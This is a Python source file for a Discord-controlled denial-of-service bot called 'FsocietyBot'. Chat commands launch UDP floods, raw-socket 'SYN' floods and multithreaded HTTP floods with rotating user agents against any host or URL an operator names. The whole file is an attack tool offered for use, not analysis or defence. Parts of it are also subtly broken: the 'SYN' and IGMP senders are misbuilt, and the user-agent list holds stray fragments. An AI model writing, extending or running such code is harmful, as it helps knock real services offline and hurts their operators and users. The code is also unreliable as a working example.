import discord
import threading
import time
import random
import socket
import requests
import asyncio

BOT_ID = "FsocietyBot"
DISCORD_TOKEN = "Token"  # Replace with your actual token

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True

client = discord.Client(intents=intents)

attack = True  
active_threads = []  
channel = None  

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
    'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
    'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
]



def udpender(host, dport, timer, punch):
    global attack
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while time.time() < timeout and attack:
            sock.sendto(punch, (host, int(dport)))
    finally:
        sock.close()

def stdhexsender(host, dport, timer, punch):
    global attack
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    try:
        while time.time() < timeout and attack:
            sock.sendto(punch, (host, int(dport)))
    finally:
        sock.close()

def synsender(host, dport, timer, punch):
    global attack
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    try:
        while time.time() < timeout and attack:
            sock.sendto(punch, (host, int(dport)))
    finally:
        sock.close()

def http_worker(target_url):
    global attack
    session = requests.Session()
    while attack:
        try:
            headers = {
                "User-Agent": random.choice(UserAgents),
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            }
            url = f"{target_url}?{random.randint(0, 10000)}"
            session.head(url, headers=headers, timeout=5)
            r = session.get(url, headers=headers, timeout=10, stream=True)
            for _ in r.iter_content(chunk_size=1024):
                if not attack:
                    break
            print(f"HTTP success: {url}")
        except Exception as e:
            print(f"HTTP error: {e}")

def start_http_attack(target_url, num_threads):
    global active_threads, attack
    threads = []
    max_threads = min(num_threads, 200)  
    print(f"Starting HTTP attack with {max_threads} threads on {target_url}")
    
    
    attack = True
    
    for _ in range(max_threads):
        t = threading.Thread(target=http_worker, args=(target_url,), daemon=True)
        threads.append(t)
        t.start()
    
    
    active_threads.extend(threads)



@client.event
async def on_ready():
    global channel
    print(f"[{BOT_ID}] Logged into Discord as {client.user}")

   
    guild = client.guilds[0]

    
    existing_channel = discord.utils.get(guild.text_channels, name="fsociety-bot 1")
    if existing_channel:
        channel = existing_channel
        print(f"[{BOT_ID}] Channel 'fsociety-bot 1' already exists.")
    else:
        
        channel = await guild.create_text_channel('fsociety-bot 1')
        print(f"[{BOT_ID}] Created channel 'fsociety-bot 1'.")

async def stop_all_attacks():
    global attack, active_threads
    attack = False
    
    
    await asyncio.sleep(1)
    
    
    active_threads = []
    
    return "All attacks have been stopped."

@client.event
async def on_message(message):
    global attack, active_threads

    
    if message.author == client.user:
        return

    content = message.content.strip()
    current_channel = message.channel

    if content == "!help":
        help_text = (
            "**FsocietyBot Attack Commands:**\n"
            "`!punisher <host> <port> <timer_sec> <packetsize>` - UDP attack (home)\n"
            "`!.secret <host> <port> <timer_sec> <packetsize>` - SYN attack\n"
            "`!HTTP <url> <threads>` - HTTP attack\n"
            "`!stop` - Stop all attacks\n"
            "`!help` - Show this message\n"
        )
        await current_channel.send(help_text)
        return

    if content.startswith("!punisher "):
        parts = content.split()
        if len(parts) != 5:
            await current_channel.send("Usage: `!punisher <host> <port> <timer_sec> <packetsize>`")
            return
        _, host, port, timer, pack = parts
        try:
            punch = random._urandom(int(pack))
        except:
            await current_channel.send("Invalid packetsize (packetsize must be an integer)")
            return
        
        
        attack = True
        
        t = threading.Thread(target=udpender, args=(host, port, timer, punch), daemon=True)
        active_threads.append(t)
        t.start()
        
        await current_channel.send(f"Starting UDP attack on {host}:{port} for {timer} seconds.")
        return

    if content.startswith("!.secret "):
        parts = content.split()
        if len(parts) != 5:
            await current_channel.send("Usage: `!.secret <host> <port> <timer_sec> <packetsize>`")
            return
        _, host, port, timer, pack = parts
        try:
            punch = random._urandom(int(pack))
        except:
            await current_channel.send("Invalid packetsize (packetsize must be an integer)")
            return
        
        
        attack = True
        
        t = threading.Thread(target=synsender, args=(host, port, timer, punch), daemon=True)
        active_threads.append(t)
        t.start()
        
        await current_channel.send(f"Starting SYN attack on {host}:{port} for {timer} seconds.")
        return

    if content.startswith("!HTTP "):
        parts = content.split()
        if len(parts) != 3:
            await current_channel.send("Usage: `!HTTP <url> <threads>`")
            return
        _, url, threads_count = parts
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        try:
            threads_num = int(threads_count)
            if threads_num <= 0:
                raise ValueError()
        except:
            await current_channel.send("Threads must be a positive integer.")
            return
        
        
        attack = True
        
        threading.Thread(target=start_http_attack, args=(url, threads_num), daemon=True).start()
        await current_channel.send(f"Starting HTTP attack on {url} with {threads_num} threads.")
        return

    if content == "!stop":
        result = await stop_all_attacks()
        await current_channel.send(result)
        return

client.run(DISCORD_TOKEN)